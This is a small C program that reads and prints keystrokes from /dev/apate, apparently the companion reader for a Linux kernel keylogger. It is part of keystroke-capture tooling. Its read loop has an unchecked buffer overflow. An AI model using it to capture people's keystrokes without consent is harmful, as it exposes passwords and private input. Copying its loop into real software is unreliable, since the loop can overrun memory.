/**
 * A trival program to read the captured keystrokes from linux device
 * Copyright (C) 2014 Ng Tzy Luen. All Rights Reserved.
 *
 * Tested under GNU C gcc 4.7.2, linux kernel v3.14.0
 */
#include <stdio.h>      /* required by printf... */
#include <fcntl.h>      /* required by open, O_RDONLY... */
#include <string.h>     /* required by memset, strerror */
#include <errno.h>      /* required by errno */

#define DEV_NAME        "/dev/apate"    /* device name */
#define BUFF_LENGTH     1024            /* array size to store keystrokes */

int main(int argc, char **argv)
{
    int ret;                /* return value of read() */
    char buff[BUFF_LENGTH]; /* the memory to store the read keystrokes */
    short i = 0;            /* buff's counter */ 
    int fp = open(DEV_NAME, O_RDONLY);  /* open the file(device) with readonly */

    if (-1 == fp) {         /* open() returns -1 if error occured */
        printf("-E- %s : %s\n", DEV_NAME, strerror(errno));/* return string describing error number */
        return errno;       /* return the error to OS */
    }

    memset(buff, 0, sizeof buff);           /* fill the buff with 0 */

    while (ret = read(fp, &buff[i++], 1));  /* read 1 byte from fp into buff; incrementally */
    if (ret == -1) {        /* read() returns -1 on error; else number of bytes read */
        printf("-E- %s\n", strerror(errno));/* return string describing error number */
        return errno;       /* return the error to OS */
    } else
        printf("%s", buff); /* print the keystrokes */

    return 0;   /* return 0 on success */
}
